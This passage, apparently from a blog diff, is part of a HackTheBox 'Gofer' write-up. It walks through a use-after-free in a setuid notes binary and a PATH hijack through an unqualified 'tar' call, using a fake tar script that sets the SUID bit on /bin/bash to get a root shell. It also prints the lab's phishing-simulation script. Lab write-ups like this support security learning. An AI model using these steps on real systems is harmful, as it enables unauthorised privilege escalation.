+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">undefined4</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">username</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x696d6461</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">undefined</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">username</span> <span class="o">+</span> <span class="mh">0x1c</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x6e</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">undefined4</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">username</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x72657375</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Choose an username: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00102144</span><span class="p">,</span><span class="n">username</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">break</span><span class="p">;</span>
+</span></span></code></pre></div><p>Case 2 shows user information,</p>
+<ul>
+<li>If the username buffer is not clear, then it prints the user info.</li>
+<li>It also prints the role at <code>username + 0x18</code>.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">username</span> <span class="o">==</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;First create an user!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Username: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">username</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Role: %s</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">,(</span><span class="kt">long</span><span class="p">)</span><span class="n">username</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">break</span><span class="p">;</span>
+</span></span></code></pre></div><p>Case 4 relates to writing a new note</p>
+<ul>
+<li>The <code>note_var</code> is allocated 40 bytes and then cleared to ensure it contains no previous data.</li>
+<li>The user input is written to <code>note_var</code>.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">  <span class="n">note_var</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">memset</span><span class="p">(</span><span class="n">note_var</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x28</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">note_var</span> <span class="o">==</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="cm">/* WARNING: Subroutine does not return */</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Write your note:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_0010218b</span><span class="p">,</span><span class="n">note_var</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">break</span><span class="p">;</span>
+</span></span></code></pre></div><p>Case 8 relates to backing up notes</p>
+<ul>
+<li>The backup routine is executed only if the role located at an offset of 40 bytes is set to &ldquo;admin&rdquo;.</li>
+<li>The archive is executed with superuser privileges.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">case</span> <span class="mi">8</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">username</span> <span class="o">==</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;First create an user!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">isAdmin</span> <span class="o">=</span> <span class="nf">strcmp</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">username</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">),</span><span class="s">&#34;admin&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">isAdmin</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Access granted!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">system</span><span class="p">(</span><span class="s">&#34;tar -czvf /root/backups/backup_notes.tar.gz /opt/notes&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Access denied: you don</span><span class="se">\&#39;</span><span class="s">t have the admin role!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h3 id="exploiting-dangling-pointer" class="relative group">Exploiting Dangling pointer <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#exploiting-dangling-pointer" aria-label="Anchor">#</a></span></h3><p>Since the role was at offset of 40 bytes, my very first thought was to create a string with the string <code>admin</code> after the 40 byte, but that doesn&rsquo;t work, because the role is set based on privileges in case 1.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; python -c <span class="s2">&#34;print(&#39;0&#39;*24+&#39;admin&#39;)&#34;</span>
+</span></span><span class="line"><span class="cl">000000000000000000000000admin
+</span></span></code></pre></div><p>Revisiting case 3, where the username is deleted, it&rsquo;s crucial to note that the username is <strong>freed but <em>not cleared or set to NULL</em></strong>. This is an issue because username was originally a void pointer and now is a <a href="https://www.blackhat.com/presentations/bh-usa-07/Afek/Whitepaper/bh-usa-07-afek-WP.pdf" target="_blank" rel="noreferrer">dangling pointer</a>. This can introduce a potential <a href="https://www.blackhat.com/docs/eu-16/materials/eu-16-Wen-Use-After-Use-After-Free-Exploit-UAF-By-Generating-Your-Own-wp.pdf" target="_blank" rel="noreferrer">use-after-free vulnerability</a>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">username</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">username</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">break</span><span class="p">;</span>
+</span></span></code></pre></div><p>In Case 4, where the <code>note_var</code> buffer is allocated 40 bytes of memory, which is the same size as the <code>username</code> buffer. Due to the way <code>malloc</code> works, the memory that was previously freed ( nut not cleared ) for the <code>username</code> buffer in case 3 will now be allocated to <code>note_var</code>.</p>
+<p>By adding 24 bytes of random data followed by &ldquo;admin&rdquo; to the <code>note_var</code> buffer, I can effectively set the role to &ldquo;admin&rdquo; since the username still points to the same buffer. This action exploits use-after-free vulnerability created in case 3, allowing me to manipulate the role.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">  <span class="n">note_var</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">memset</span><span class="p">(</span><span class="n">note_var</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x28</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">note_var</span> <span class="o">==</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="cm">/* WARNING: Subroutine does not return */</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Write your note:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_0010218b</span><span class="p">,</span><span class="n">note_var</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">break</span><span class="p">;</span>
+</span></span></code></pre></div><p>Exploitation path for the dangling pointer</p>
+<ul>
+<li>Create a new user, which initializes the role based on privileges.</li>
+<li>Delete the user, causing <code>free()</code> to deallocate the pointer and create a dangling pointer.</li>
+<li>Create a new note with data containing 24 random characters followed by &ldquo;admin.&rdquo; This manipulation of the <code>note_var</code> buffer effectively sets the role as &ldquo;admin&rdquo; by exploiting the dangling pointer.</li>
+<li>With the &ldquo;admin&rdquo; role, execute the backup routine, which runs the <code>system(&quot;tar -czvf /root/backups/backup_notes.tar.gz /opt/notes&quot;);</code> command.</li>
+<li>Exploit PATH hijacking since <code>tar</code> doesn&rsquo;t have an absolute path set, allowing me to run my own malicious binary.</li>
+</ul>
+<p><strong>Path Hijacking</strong></p>
+<p>I created a file named &ldquo;tar&rdquo; with malicious code in the <code>/dev/shm</code> directory, made it executable, and added <code>/dev/shm</code> to the PATH. By doing this, I can successfully exploit the PATH hijacking vulnerability. As a result, when the archive function will, my malicious &ldquo;tar&rdquo; file in <code>/dev/shm</code> runs first, executing my malicious code.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> tbuckley@gofer.htb:/dev/shm$ cat tar
+</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">chmod +s /bin/bash
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> tbuckley@gofer.htb:/dev/shm$ chmod +x tar
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> tbuckley@gofer.htb:/dev/shm$ <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span>/dev/shm:<span class="nv">$PATH</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> tbuckley@gofer.htb:/dev/shm$ <span class="nb">echo</span> <span class="nv">$PATH</span>
+</span></span><span class="line"><span class="cl">/dev/shm:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/sbin:/usr/sbin:/usr/local/sbin
+</span></span></code></pre></div><p>The notes content can be created easily using python</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> tbuckley@gofer.htb:/dev/shm$ python3 -c <span class="s2">&#34;print(&#39;0&#39;*24+&#39;admin&#39;)&#34;</span>
+</span></span><span class="line"><span class="cl">000000000000000000000000admin
+</span></span></code></pre></div><p>Once all the necessary conditions are in place, I can trick the backup function into executing my malicious file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> tbuckley@gofer.htb:/dev/shm$ /usr/local/bin/notes
+</span></span><span class="line"><span class="cl"><span class="o">========================================</span>
+</span></span><span class="line"><span class="cl">1<span class="o">)</span> Create an user and choose an username
+</span></span><span class="line"><span class="cl">2<span class="o">)</span> Show user information
+</span></span><span class="line"><span class="cl">3<span class="o">)</span> Delete an user
+</span></span><span class="line"><span class="cl">4<span class="o">)</span> Write a note
+</span></span><span class="line"><span class="cl">5<span class="o">)</span> Show a note
+</span></span><span class="line"><span class="cl">6<span class="o">)</span> Save a note <span class="o">(</span>not yet implemented<span class="o">)</span>
+</span></span><span class="line"><span class="cl">7<span class="o">)</span> Delete a note
+</span></span><span class="line"><span class="cl">8<span class="o">)</span> Backup notes
+</span></span><span class="line"><span class="cl">9<span class="o">)</span> <span class="nv">Quit</span>
+</span></span><span class="line"><span class="cl"><span class="o">========================================</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Your choice: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Choose an username: randomUser
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl"><span class="o">========================================</span>
+</span></span><span class="line"><span class="cl">3<span class="o">)</span> Delete an user
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Your choice: <span class="m">3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl"><span class="o">========================================</span>
+</span></span><span class="line"><span class="cl">4<span class="o">)</span> Write a note
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Your choice: <span class="m">4</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Write your note:
+</span></span><span class="line"><span class="cl">000000000000000000000000admin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl"><span class="o">========================================</span>
+</span></span><span class="line"><span class="cl">2<span class="o">)</span> Show user information
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Your choice: <span class="m">2</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Username: 000000000000000000000000admin
+</span></span><span class="line"><span class="cl">Role: admin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl"><span class="o">========================================</span>
+</span></span><span class="line"><span class="cl">8<span class="o">)</span> Backup notes
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Your choice: <span class="m">8</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Access granted!
+</span></span></code></pre></div><p>Now that I have executed the backup function, the malicious code was executed and <code>/bin/bash</code> has a SUID bit set.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> tbuckley@gofer.htb:/dev/shm$ ls -la /bin/bash
+</span></span><span class="line"><span class="cl">-rwsr-sr-x <span class="m">1</span> root root <span class="m">1234376</span> Mar <span class="m">27</span>  <span class="m">2022</span> /bin/bash
+</span></span></code></pre></div><p>Since <code>/bin/bash</code> is owned by root and has the SUID bit set, I can execute bash in in privileged mode granting effective root privileges.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> tbuckley@gofer.htb:/dev/shm$ bash -p
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> root@gofer.htb:/dev/shm# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>tbuckley<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>tbuckley<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1002<span class="o">(</span>tbuckley<span class="o">)</span>,1004<span class="o">(</span>dev<span class="o">)</span>
+</span></span></code></pre></div><p><strong>Pwned!!</strong></p>
+<!-- ![Pwned](https://i.imgur.com/WTScFbu.png) -->
+<h2 id="beyond-root" class="relative group">Beyond Root <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#beyond-root" aria-label="Anchor">#</a></span></h2><p>I was curious how the phishing attempt was stimulated in this HackTheBox environment since there are no real users. The <code>mail.sh</code> script in the root directory helps shed a light on this.</p>
+<ul>
+<li>All URLs in the email sent to the user, <code>jhudson</code> are collected in the URLS variable</li>
+<li>For each URL the linked files are downloaded to <code>jhudson</code>&rsquo;s download directory.</li>
+<li>Next the ownership is changed to <code>jhudson</code> and file permissions to &ldquo;755&rdquo;, making them executable by <code>jhudson</code>.</li>
+<li>LibreOffice is executed in headless mode to open the downloaded files in view-only mode. This represents a scenario where a malicious macro could potentially be triggered.</li>
+<li>There&rsquo;s also a wait period of 3 seconds, which I am assuming is to mimic user interaction.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> root@gofer.htb:/root/scripts# cat mail.sh
+</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">USER</span><span class="o">=</span><span class="s2">&#34;jhudson&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">URLS</span><span class="o">=</span><span class="k">$(</span>/usr/bin/grep -Eo <span class="s1">&#39;http://[^ &gt;]+&#39;</span> /var/mail/<span class="nv">$USER</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/usr/bin/mkdir /home/<span class="nv">$USER</span>/Downloads
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> u in <span class="nv">$URLS</span>
+</span></span><span class="line"><span class="cl"><span class="k">do</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="nv">$u</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">NAME</span><span class="o">=</span><span class="k">$(</span>basename <span class="nv">$u</span><span class="p">|</span>cut -d <span class="s1">&#39;.&#39;</span> -f 1<span class="k">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">EXT</span><span class="o">=</span><span class="k">$(</span>basename <span class="nv">$u</span><span class="p">|</span>cut -d <span class="s1">&#39;.&#39;</span> -f 2<span class="k">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">RANDOMNB</span><span class="o">=</span><span class="k">$(</span>date +%s%N<span class="k">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">FILENAME</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$NAME$RANDOMNB</span><span class="s2">.</span><span class="nv">$EXT</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    timeout <span class="m">10</span> wget -O <span class="s2">&#34;/home/</span><span class="nv">$USER</span><span class="s2">/Downloads/</span><span class="nv">$FILENAME</span><span class="s2">&#34;</span> <span class="nv">$u</span>
+</span></span><span class="line"><span class="cl">    /usr/bin/chown <span class="nv">$USER</span>:<span class="nv">$USER</span> /home/<span class="nv">$USER</span>/Downloads/<span class="nv">$FILENAME</span>
+</span></span><span class="line"><span class="cl">    /usr/bin/chmod <span class="m">755</span> <span class="s2">&#34;/home/</span><span class="nv">$USER</span><span class="s2">/Downloads/</span><span class="nv">$FILENAME</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    sleep <span class="m">3</span>
+</span></span><span class="line"><span class="cl">    /bin/su -c <span class="s2">&#34;cd /usr/bin; ./libreoffice -env:SingleAppInstance=false --norestore --view --headless --nologo --nolockcheck --eventtesting /home/</span><span class="nv">$USER</span><span class="s2">/Downloads/</span><span class="nv">$FILENAME</span><span class="s2"> &amp;&#34;</span> <span class="nv">$USER</span>
+</span></span><span class="line"><span class="cl">    sleep <span class="m">3</span>
+</span></span><span class="line"><span class="cl">    /usr/bin/killall oosplash
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;&#34;</span> &gt; /var/mail/<span class="nv">$USER</span>
+</span></span><span class="line"><span class="cl">rm -rf /home/<span class="nv">$USER</span>/Downloads/*
+</span></span></code></pre></div><hr>
+<h1 id="related-links" class="relative group">Related Links <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#related-links" aria-label="Anchor">#</a></span></h1><ul>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery#gopher" target="_blank" rel="noreferrer">SSRF (Server Side Request Forgery) - HackTricks</a></li>
+<li><a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noreferrer">tarunkant/Gopherus: This tool generates gopher link for exploiting SSRF and gaining RCE in various servers</a></li>
+<li><a href="https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/" target="_blank" rel="noreferrer">Blog on Gopherus Tool</a></li>
+<li><a href="https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html" target="_blank" rel="noreferrer">Using Malicious LibreOffice Calc Macros to Target Linux</a></li>
+<li><a href="https://help.libreoffice.org/6.1/he/text/sbasic/shared/03130500.html" target="_blank" rel="noreferrer">Shell Function - LibreOffice Docs</a></li>
+<li><a href="https://ask.libreoffice.org/t/how-to-use-shell-from-basic-macro-solved/23590" target="_blank" rel="noreferrer">How to use shell from basic macro (solved) - English - Ask LibreOffice</a></li>
+<li><a href="https://www.blackhat.com/presentations/bh-usa-07/Afek/Whitepaper/bh-usa-07-afek-WP.pdf" target="_blank" rel="noreferrer">Dangling Pointer - SMASHING THE POINTER FOR FUN AND PROFIT</a></li>
+<li><a href="https://www.blackhat.com/docs/eu-16/materials/eu-16-Wen-Use-After-Use-After-Free-Exploit-UAF-By-Generating-Your-Own-wp.pdf" target="_blank" rel="noreferrer">Use-After-Use-After-Free: Exploit UAF by Generating Your Own whitepaper</a></li>
+</ul>
+
+      </div>
+    </section>
+    <footer class="max-w-prose pt-8 print:hidden">
+      
+
+      
+  
+  <section class="flex flex-row flex-wrap justify-center pt-4 text-xl">
+    
+      
+        <a
+          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://twitter.com/intent/tweet/?url=//localhost:1313/blog/htb-gofer/&amp;text=Htb%20Gofer"
+          title="Tweet on Twitter"
+          aria-label="Tweet on Twitter"
+          target="_blank"
+          rel="noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
+</span></a
+        >
+      
+    
+      
+        <a
+          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://www.linkedin.com/shareArticle?mini=true&amp;url=//localhost:1313/blog/htb-gofer/&amp;title=Htb%20Gofer"
+          title="Share on LinkedIn"
+          aria-label="Share on LinkedIn"
+          target="_blank"
+          rel="noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+</span></a
+        >
+      
+    
+      
+        <a
+          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://reddit.com/submit/?url=//localhost:1313/blog/htb-gofer/&amp;resubmit=true&amp;title=Htb%20Gofer"
+          title="Submit to Reddit"
+          aria-label="Submit to Reddit"
+          target="_blank"
+          rel="noopener noreferrer"
